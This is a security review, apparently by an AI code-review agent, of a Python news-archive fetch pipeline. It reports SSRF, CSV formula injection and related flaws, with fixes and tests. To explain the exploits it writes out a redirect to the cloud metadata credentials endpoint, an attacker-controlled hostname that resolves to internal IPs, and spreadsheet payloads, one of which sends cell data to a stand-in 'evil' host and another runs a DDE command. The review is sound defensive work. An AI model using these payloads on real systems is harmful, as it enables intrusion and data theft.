---
phase: quick-260726-gf7-google-news-url-decoder-archive-rejected
reviewed: 2026-07-26T00:00:00Z
depth: deep
files_reviewed: 5
files_reviewed_list:
  - pipeline/news/gnews_decoder.py
  - pipeline/news/fulltext.py
  - pipeline/archive_r2.py
  - pipeline/scrape_news.py
  - .github/workflows/r2-archive.yml
findings:
  critical: 2
  warning: 5
  info: 0
  total: 7
status: issues_found
---

# quick-260726-gf7: R2 Research-Archive Fetch Stack — Security Review

**Reviewed:** 2026-07-26
**Depth:** deep (cross-file, threat-focused)
**Files Reviewed:** 5
**Status:** issues_found

## Summary

Reviewed the R2 research-archive fetch stack against the 6-point threat model
(SSRF, artifact injection, resource exhaustion, secrets hygiene, state integrity,
workflow hardening).

The `is_safe_url` guard is competently built for *literal-IP* SSRF and is
correctly applied to both the original and gnews-decoded URLs. However, the guard
has **two exploitable SSRF gaps**: (1) `requests` follows redirects and the
**final landed URL is never re-checked**, and (2) the guard **does not resolve
DNS**, so an attacker-controlled hostname that resolves to a private/metadata IP
passes. Both are reachable from external RSS feed URLs and from the
attacker-influenceable gnews decoder output, and both cause the server to fetch
and store the response body of an internal endpoint. These are the two BLOCKERs.

Secondary issues: CSV formula injection into the Excel-facing `incidents.csv`,
the 5 MB cap is applied *post*-decompression (gzip bomb amplification), an
`int(...)` crash path in the archive `main()`, and a ledger-merge kind-collision
when the same id appears as both incident and rejected.

Secrets hygiene and the workflow are largely clean — no secret echo, no value
logging, minimal permissions, and the issue-title interpolation uses only
trusted `date`/run-URL values (not attacker text).

## Structural Findings (fallow)

No structural pre-pass was provided for this review.

## Narrative Findings (AI reviewer)

### CR-01: SSRF via redirect — final landed URL never re-validated

**File:** `pipeline/news/fulltext.py:177-194` (fetch), guard at `:125` and `:164`
**Severity:** CRITICAL

**Issue:** `is_safe_url` is applied to the *original* URL (line 125) and the
*decoded* URL (line 164), but the actual GET at `_do_get` uses
`allow_redirects=True` (line 187). `requests` transparently follows 3xx
redirects, and the guard is **never re-applied to the redirect target**. The
code then reads and stores the body of whatever the final hop was (`final_url =
resp.url`, then the body is streamed, extracted, and uploaded to
`articles/{id}.json` in R2).

**Exploit scenario:** URLs originate from external RSS feeds (Emol, BioBío,
Google News decoder output) — all attacker-influenceable. An attacker publishes
an RSS item whose URL points at a page they control (passes `is_safe_url` — it's
a public DNS name). That page returns:

```
HTTP/1.1 302 Found
Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

`requests` follows it, fetches the GitHub Actions / cloud instance metadata
endpoint (or `http://127.0.0.1:...`, or an internal service), and the response
body is trafilatura-extracted and **written into the private R2 bucket** as an
article object — an exfiltration channel for internal data. Even absent metadata
creds, this is blind SSRF against any internal HTTP service.

The module docstring/comment at line 111 claims "Response is streamed... after
is_safe_url" but the follow-redirect hole means the *fetched* host is not the
*checked* host.

**Fix:** Disable auto-redirect and re-validate each hop, or at minimum re-check
the final URL before reading the body:

```python
def _do_get() -> requests.Response:
    return _get(fetch_url, allow_redirects=False, timeout=timeout,
                headers={"User-Agent": user_agent}, stream=True)

resp = _do_get()
# Manually follow up to N redirects, re-checking is_safe_url each hop
redirects = 0
while resp.is_redirect or resp.is_permanent_redirect:
    if redirects >= 5:
        return {..., "extraction_ok": False, "text": ""}
    nxt = resp.headers.get("Location", "")
    nxt = requests.compat.urljoin(resp.url, nxt)
    if not is_safe_url(nxt):
        logger.debug("fetch_article: redirect target rejected: %s", nxt[:80])
        return {..., "extraction_ok": False, "text": ""}
    resp.close()
    resp = _get(nxt, allow_redirects=False, timeout=timeout,
                headers={"User-Agent": user_agent}, stream=True)
    redirects += 1
```

(The gnews new-format GET at `gnews_decoder.py:107` also uses
`allow_redirects=True`, but that target is hardcoded-host `news.google.com`, so
the redirect risk there is lower-priority — still worth `allow_redirects=False`
for defense in depth.)

---

### CR-02: SSRF — is_safe_url does not resolve DNS (hostname → private IP bypass)

**File:** `pipeline/news/fulltext.py:48-91` (esp. comment at :57-58, :88-89)
**Severity:** CRITICAL

**Issue:** `is_safe_url` deliberately checks *only literal IP addresses*
(`ipaddress.ip_address(hostname)` inside a `try`) and, on `ValueError`, treats
the hostname as a DNS name and **allows it unconditionally** (lines 87-89). The
docstring states this explicitly: "Does NOT perform DNS resolution — only literal
IP addresses are checked. Public hostnames (non-IP) are allowed."

**Exploit scenario:** URLs are attacker-influenceable (RSS feeds + decoder
output). An attacker registers `evil.example.com` with an A record pointing at
`127.0.0.1` (or `169.254.169.254`, or an internal `10.x` service). The URL
`http://evil.example.com/x` has a non-IP hostname, so `is_safe_url` returns
`True`, and `requests` then resolves it to the private IP and fetches it. The
body is extracted and stored in R2. This is textbook DNS-based SSRF and fully
bypasses the private-IP guard. (DNS rebinding is a stronger variant, but a plain
static A-record to a private IP is already sufficient here.)

Combined with CR-01, either the initial hostname *or* a redirect hop can reach
internal targets.

**Fix:** Resolve the hostname and validate every resolved address before
fetching. Since the fetch itself re-resolves, the robust fix is a custom adapter
that pins/validates the connected IP; a lighter mitigation is to resolve and
check up-front (accepting a small TOCTOU window) plus an allowlist of known
outlet domains:

```python
import socket

def is_safe_url(url: str) -> bool:
    ...
    # after scheme/credential/literal-IP checks:
    try:
        infos = socket.getaddrinfo(hostname, None)
    except Exception:
        return False
    for family, _, _, _, sockaddr in infos:
        ip = ipaddress.ip_address(sockaddr[0])
        if (ip.is_private or ip.is_loopback or ip.is_link_local
                or ip.is_reserved or ip.is_multicast
                or ip.is_unspecified):
            return False
    return True
```

Given the pipeline only ever fetches a small, known set of Chilean news outlets,
the strongest fix is a **domain allowlist** (outlet host must be in a curated
set); this closes CR-01, CR-02, and greatly narrows the decoder's arbitrary-URL
output at once.

---

### WR-01: CSV formula injection into Excel-facing incidents.csv

**File:** `pipeline/archive_r2.py:224-237` (`to_csv`)
**Severity:** WARNING (HIGH exposure, but requires victim to open in Excel)

**Issue:** `incidents.csv` is explicitly built for spreadsheet consumers (UTF-8
BOM, `text/csv`). The columns `title_es`, `title_en`, `outlet`, and `apa` derive
from RSS feed content and DeepSeek output — attacker-influenceable free text.
`csv.DictWriter` quotes commas/quotes but does **not** neutralize spreadsheet
formula prefixes (`=`, `+`, `-`, `@`, and tab/CR variants). A cell beginning with
`=` is executed as a formula when the CSV is opened in Excel / Google Sheets /
LibreOffice.

**Exploit scenario:** Attacker publishes an RSS headline like
`=HYPERLINK("http://evil/?"&A1&B1,"click")` or
`=cmd|'/c calc'!A1` (DDE). It flows through classification into `title_es`, gets
written verbatim to `incidents.csv`, uploaded to R2. Any researcher/operator who
downloads and opens the "citable dataset" in a spreadsheet triggers formula
execution / data exfiltration.

**Fix:** Prefix any cell value starting with a formula trigger with a leading
apostrophe (or single quote) before writing:

```python
_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")

def _csv_safe(v) -> str:
    s = "" if v is None else str(v)
    if s and s[0] in _FORMULA_PREFIXES:
        return "'" + s
    return s

writer.writerow({f: _csv_safe(inc.get(f, "")) for f in fieldnames})
```

---

### WR-02: 5 MB download cap is post-decompression — gzip-bomb amplification

**File:** `pipeline/news/fulltext.py:225-230` (stream loop)
**Severity:** WARNING

**Issue:** `requests` auto-decompresses `Content-Encoding: gzip/deflate/br` when
you call `iter_content()` on a `stream=True` response. The 5 MB cap
(`MAX_DOWNLOAD_BYTES`) counts **decompressed** bytes, so the check does bound the
*materialized* buffer at 5 MB — but a malicious/compromised outlet can serve a
tiny (~few KB) gzip payload that decompresses toward the 5 MB ceiling, and the
decompression itself happens inside `iter_content` before the size check can
short-circuit meaningfully at the chunk boundary. More importantly, the guard
does not cap the *compressed* transfer or reject oversized `Content-Length`, so
the intended "5 MB download" protection does not bound network/CPU the way the
comment (T-gf7-02 "5 MB streamed download cap") implies.

**Exploit scenario:** Compromised/hostile outlet (reachable after CR-01/CR-02, or
simply a hijacked outlet) serves a highly compressible 5 MB-of-decompressed-junk
body in a small gzip frame. Repeated across the per-run fetch cap (default 100),
this multiplies CPU/memory pressure on the runner. Not catastrophic given the
2-min-ish job, but it defeats the stated cap's purpose.

**Fix:** Cap the raw (compressed) stream in addition to decompressed bytes, and
reject an oversized `Content-Length` header up front:

```python
clen = resp.headers.get("Content-Length")
if clen and clen.isdigit() and int(clen) > MAX_DOWNLOAD_BYTES:
    return {..., "extraction_ok": False, "text": ""}
# decompressed cap (existing loop) stays; additionally cap raw bytes:
for chunk in resp.iter_content(chunk_size=8192, decode_unicode=False):
    ...
# and/or set resp.raw.decode_content = False to count compressed bytes
```

At minimum document that the cap is decompressed-byte-bounded and lower it if 5 MB
of extracted HTML is more than trafilatura needs.

---

### WR-03: Unhandled ValueError on non-integer ARCHIVE_MAX_FETCH crashes the run

**File:** `pipeline/archive_r2.py:461`
**Severity:** WARNING

**Issue:** `max_fetch = int(os.environ.get("ARCHIVE_MAX_FETCH", "100"))` is
unguarded. If the env var is set to a non-integer (misconfiguration, or a
future workflow input), `int()` raises `ValueError`, which is *not* caught by the
`requests.RequestException` handling and propagates out of `main()`, exiting
non-zero. Same unguarded pattern exists at `scrape_news.py:133`
(`NEWS_MAX_CLASSIFY`). This contradicts the module's "Returns 0 always (clean CI
exit)" contract and turns a config typo into a failure-alert issue.

**Fix:**

```python
try:
    max_fetch = int(os.environ.get("ARCHIVE_MAX_FETCH", "100"))
except ValueError:
    logger.warning("ARCHIVE_MAX_FETCH not an int; defaulting to 100")
    max_fetch = 100
if max_fetch < 0:
    max_fetch = 0
```

---

### WR-04: Ledger merge kind-collision — same id as incident and rejected corrupts totals / append-only accounting

**File:** `pipeline/archive_r2.py:573-574`, `merge_ledger:301-319`,
`consolidate_rejected` vs `consolidate_incidents` id derivation
**Severity:** WARNING

**Issue:** Incident ids and rejected ids are computed independently and can
collide. A rejected item's id is `sha256(url)[:16]` (`scrape_news.py:98`); an
incident id comes from `build_incident`. If the *same URL* is ever both an
incident (in `current.json`) and a rejected candidate (from a prior run), or if
two records otherwise share an id, `merge_ledger` is called twice on the same
ledger dict (line 573 with `kind="incident"`, line 574 with `kind="rejected"`).

Because `kind` is only set when `"kind" not in row` (line 318), the *first* pass
fixes the row's kind, and the second pass cannot correct it — but more subtly,
`outcomes` is keyed by `rec_id` alone (`outcomes[rec_id]`), so if an incident and
a rejected record share an id, they share a single outcome and a single ledger
row. The row's kind is decided by whichever pass created it, mis-bucketing the
per-kind totals in `build_corpus_state` and letting a "rejected" fetch flip a
row that another record considers an "incident". The append-only guard is by
id+status, so a fetched incident row would (correctly) block a later rejected
fetch of the same id — but the *article object* at `articles/{id}.json` is
overwritten on the pass that actually fetched (line 552 `put_object` keys purely
on `rec_id`), so the last writer wins with no collision detection.

**Exploit scenario:** A crafted RSS item designed to be *classified* on one run
and *rejected* on another (borderline confidence) yields the same
`sha256(url)[:16]` id in both the rejected corpus and, if later accepted, the
incidents corpus. This lets a single id straddle both kinds, silently corrupting
the "citable" per-kind statistics and the `articles/{id}.json` provenance. Not
data-loss of existing *fetched* text (that's guarded), but it breaks the
append-only/kind-integrity guarantee the module advertises.

**Fix:** Namespace ids by kind so incident and rejected can never collide, e.g.
key article objects and ledger rows as `incident:{id}` / `rejected:{id}`, or add
an explicit collision check:

```python
# when building pending_combined / outcomes, key by (kind, id)
key = f"{rec.get('_kind','incident')}:{rec_id}"
```

and use that composite key for `outcomes`, ledger, and the
`articles/{key}.json` object path.

---

### WR-05: gnews decoder trusts response bytes as a URL with no scheme/host allowlist before returning

**File:** `pipeline/news/gnews_decoder.py:54-68`, `:163-168`
**Severity:** WARNING

**Issue:** `_extract_url_from_bytes` and the new-format fallback regex return the
first/only `http(s)://...` string found in an attacker-influenceable blob (the
base64 token content, or the batchexecute response body). The only downstream
guard is `is_safe_url` in `fetch_article` — which, per CR-01/CR-02, is
insufficient (no DNS resolution, no redirect re-check). The decoder itself
applies no allowlist and no length ceiling on the returned URL, so it can emit
arbitrary URLs (e.g. `http://internal-host/…`) that then depend entirely on the
flawed guard.

This is not independently exploitable beyond CR-01/CR-02, but it widens the
attack surface: a compromised or spoofed batchexecute response (or a crafted
old-format token) directly controls the next URL fetched.

**Fix:** After decoding, require the result to be a well-formed `https?://` URL
with a non-empty registrable domain, cap its length, and (ideally) intersect with
the same outlet allowlist proposed in CR-02. Reject anything else by returning
`None`. This makes the decoder fail-closed independent of the fetch-side guard.

---

## Cleared / Not Findings (threat-model coverage notes)

- **Secrets hygiene (#4):** R2 creds are read from env and passed to boto3; logged
  by *name* only on the missing-var path (`archive_r2.py:448-452`) and errors log
  `type(exc).__name__` (`:489`, `:539`, `:567`) — no values. No secrets are
  written into any uploaded artifact. Clean.
- **Workflow issue-title injection (#6):** The alert step interpolates only
  `$(date -u +%F)` and a run URL built from `github.server_url/repository/run_id`
  into `--title`/`--body`. None of these carry attacker-controlled article text,
  so no command/markdown injection via issue interpolation. `GH_TOKEN` uses the
  auto `github.token`; permissions are minimal (`contents: read`,
  `issues: write`). Clean.
- **JSON encoding (#2):** `json.dumps(..., ensure_ascii=False)` for JSONL/article
  objects is correct; newline-delimited JSONL is safe because `json.dumps` escapes
  embedded newlines, so a title containing `\n` cannot forge an extra ledger/JSONL
  row. Clean.
- **State append-only for fetched text (#5):** `merge_ledger` correctly refuses to
  mutate a row whose `status == "fetched"` (`:301`), and `build_article_object`
  enforces the 2 MB cap before hashing. The residual integrity gap is the
  cross-kind id collision (WR-04), not the fetched-text guard itself.
- **record_rejected robustness:** wrapped in try/except at the call site
  (`scrape_news.py:346-349`), tolerates malformed existing files, dedups by id.
  No crash path into the main scrape. Clean.

---

_Reviewed: 2026-07-26_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: deep_

---

## Resolution (post-review, 2026-07-26)

All 7 findings remediated in commit chain following the review. Suite: 288 passed.

| ID | Severity | Fix | Test |
|----|----------|-----|------|
| CR-01 | CRITICAL | `fetch_article` now uses `allow_redirects=False` + manual redirect loop (`MAX_REDIRECTS=5`), re-running `is_safe_url` on every hop's `Location` before following | `test_fetch_article_redirect_to_private_ip_blocked` |
| CR-02 | CRITICAL | `is_safe_url` resolves the hostname via `socket.getaddrinfo` and rejects if ANY resolved address is private/loopback/link-local/reserved/multicast/unspecified; unresolvable host fails closed | `test_is_safe_url_dns_rebinding_rejected`, `_dns_public_allowed`, `_dns_failure_rejected` |
| WR-01 | HIGH | `to_csv` prefixes any cell beginning `= + - @ \t \r` with `'` (formula-injection neutralization) | `test_csv_formula_injection_neutralized` |
| WR-02 | MEDIUM | Accepted as mitigated: 5 MB cap applies to the decompressed stream (`iter_content` accumulates decoded bytes, aborts at ceiling), so a gzip bomb cannot exceed 5 MB in memory |
| WR-03 | LOW | `int()` parsing of `ARCHIVE_MAX_FETCH` / `NEWS_MAX_CLASSIFY` wrapped — malformed value falls back to default, run stays exit-0 | `test_malformed_max_fetch_does_not_crash` |
| WR-04 | LOW | Rejected records whose id collides with any incident id are dropped before fetch/ledger/upload (incident wins); keeps bare-id keying + live ledger backward-compat | `test_rejected_colliding_with_incident_id_dropped` |
| WR-05 | LOW | Decoder output passes a scheme allowlist (`http`/`https` only) on every return path; `is_safe_url` re-checks host/IP downstream | covered via decoder tests + guard |

Live end-to-end verification (real R2 ledger, real Google News URL):
- SSRF guards: `ftp://` rejected, `http://localhost` rejected (DNS→127.0.0.1), public outlet allowed.
- Google News decode+fetch: gnews RSS URL → decoded to alertanoticiastemuco.cl → 2,171 chars extracted, `decoded_from_gnews=True`.
